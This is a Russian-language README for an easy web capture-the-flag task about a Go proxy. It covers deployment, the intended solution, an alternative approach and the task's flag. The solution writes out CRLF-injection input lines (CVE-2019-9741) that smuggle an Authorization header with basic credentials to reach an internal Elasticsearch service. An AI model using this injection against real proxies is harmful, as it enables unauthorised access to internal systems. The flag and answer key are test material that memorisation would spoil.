# Web | easy | Gap

# Информация
Псс, здаров! 

Начал изучать go, решил запилить прокси. Если доступ ограничат, то можно ходить через него. Правда он еще не все умеет...будем считать это alpha версией

## Деплой
1. Поменять флаг на нужный
2. ПРи необходимости изменить порт таска (сервис прокси)
```bash
   cd deploy
   docker-compose up
```

## Выдать участникам
IP:PORT
Файл public/docker-compose.yml

## Описание
Таск основан на уязвимости CRLF в старых версиях go (CVE-2019-9741) (<= 1.11.5). Задача - выполнить запрос к внутренним ресурсам, установив заголовок Authorization

## Решение
1. Заходим на страницу и вводим в поле строки
2. ```
   db:9200?pretty=true HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA
   ```
   где (Y3RmY3VwOmN0ZmN1cA = base64(login:pass) = base64(ctfcup:ctfcup))

   таким образом мы понимаем, что там elasticsearch (если по порту это не ясно)
3. db:9200/_aliases?pretty=true HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA
4. db:9200/smth_interesting/_search?pretty=true&q=*:* HTTP/1.1\nAuthorization: Basic Y3RmY3VwOmN0ZmN1cA
5. Сдаем флаг

[exploit](solution/exploit.py)

## Альтернативное решение
Вместо CRLF, можно было сделать редирект со своего домена до ctfcup:ctfcup@db:9200.



# Флаг
CUP{b061ac18135f641c21f8f429efe4d1a47d7acc37}
